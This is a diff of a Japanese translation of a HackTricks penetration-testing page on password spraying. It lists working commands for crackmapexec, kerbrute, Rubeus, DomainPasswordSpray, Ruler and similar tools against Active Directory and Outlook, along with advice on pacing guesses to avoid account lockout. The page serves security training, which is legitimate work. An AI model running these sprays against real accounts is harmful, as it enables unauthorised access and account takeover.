@@ -2,30 +2,30 @@
 
 <details>
 
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricks をサポートする他の方法:
 
-* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする**
+* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。
 
 </details>
 
 ## **パスワードスプレー**
 
-いくつかの**有効なユーザー名**を見つけたら、発見した各ユーザーに対して最も**一般的なパスワード**を試すことができます（環境のパスワードポリシーを念頭に置いてください）。\
-**デフォルト**では、**最小**の**パスワード**の**長さ**は**7**です。
+いくつかの **有効なユーザー名** を見つけたら、環境の **パスワードポリシー** を考慮しながら、それぞれの発見されたユーザーに対して最も **一般的なパスワード** を試すことができます。\
+**デフォルト** では、**最小** **パスワード** **長** は **7** です。
 
-一般的なユーザー名のリストも役立つかもしれません: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+一覧の一般的なユーザー名も役立つ場合があります: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-複数の間違ったパスワードを試すと**アカウントがロックアウトされる可能性がある**ことに注意してください（デフォルトでは10回以上）。
+注意: **いくつかの間違ったパスワードを試すと、アカウントがロックアウトされる可能性があります**（デフォルトでは10回以上）。
 
-### パスワードポリシーを取得する
+### パスワードポリシーを取得
 
-あなたがいくつかのユーザーの資格情報を持っているか、ドメインユーザーとしてシェルを持っている場合、次の方法で**パスワードポリシーを取得**できます：
+ユーザー資格情報またはドメインユーザーとしてのシェルがある場合、**次のコマンドでパスワードポリシーを取得できます**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -44,34 +44,34 @@ net accounts
 ```
 ### Linux（またはすべて）からの悪用
 
-* **crackmapexec** を使用して：
+* **crackmapexec**を使用する:
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-* [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) の使用
+* [**kerbrute**](https://github.com/ropnop/kerbrute)（Go）を使用します。
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-* [**spray**](https://github.com/Greenwolf/Spray) _**(アカウントのロックを避けるために試行回数を指定できます):**_
+* [**スプレー**](https://github.com/Greenwolf/Spray) _**(ロックアウトを回避するための試行回数を示すことができます):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-* [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) の使用 - 推奨されない場合がある（時々動作しない）
+* [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute)を使用（python）- おすすめしません。時々動作しない可能性があります。
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-* **Metasploit**の`scanner/smb/smb_login`モジュールを使用して:
+* **Metasploit**の`scanner/smb/smb_login`モジュールを使用する：
 
 ![](<../../.gitbook/assets/image (132) (1).png>)
 
-* **rpcclient**を使用して:
+* **rpcclient**を使用する：
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -80,7 +80,7 @@ done
 ```
 #### Windowsから
 
-* ブルートモジュールを備えた[Rubeus](https://github.com/Zer1t0/Rubeus)のバージョンで：
+* [Rubeus](https://github.com/Zer1t0/Rubeus)のブルートモジュールを使用して:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -88,11 +88,11 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用して（デフォルトでドメインからユーザーを生成し、ドメインからパスワードポリシーを取得し、それに応じて試行回数を制限します）：
+* [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)を使用する（デフォルトでドメインからユーザーを生成し、ドメインからパスワードポリシーを取得し、それに応じて試行回数を制限します）:
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-* [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) を使用して
+* [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)を使用して
 ```
 Invoke-SprayEmptyPassword
 ```
@@ -108,13 +108,13 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 
 Outlookのパスワードスプレーには複数のツールがあります。
 
-* [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)を使用
-* [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)を使用
-* [Ruler](https://github.com/sensepost/ruler)を使用（信頼性が高い！）
-* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)を使用（Powershell）
-* [MailSniper](https://github.com/dafthack/MailSniper)を使用（Powershell）
+* [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)を使用する
+* [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)を使用する
+* [Ruler](https://github.com/sensepost/ruler)を使用する（信頼性が高い！）
+* [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)を使用する（Powershell）
+* [MailSniper](https://github.com/dafthack/MailSniper)を使用する（Powershell）
 
-これらのツールを使用するには、ユーザーリストとパスワード/少数のパスワードリストが必要です。
+これらのツールのいずれかを使用するには、ユーザーリストとパスワード/スプレーする少量のパスワードが必要です。
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -133,23 +133,23 @@ Outlookのパスワードスプレーには複数のツールがあります。
 * [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 * [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## 参考文献
+## References
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 * [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
-* www.blackhillsinfosec.com/?p=5296
+* [www.blackhillsinfosec.com/?p=5296](www.blackhillsinfosec.com/?p=5296)
 * [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
 <details>
 
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>
 
 HackTricksをサポートする他の方法:
 
-* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
+* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
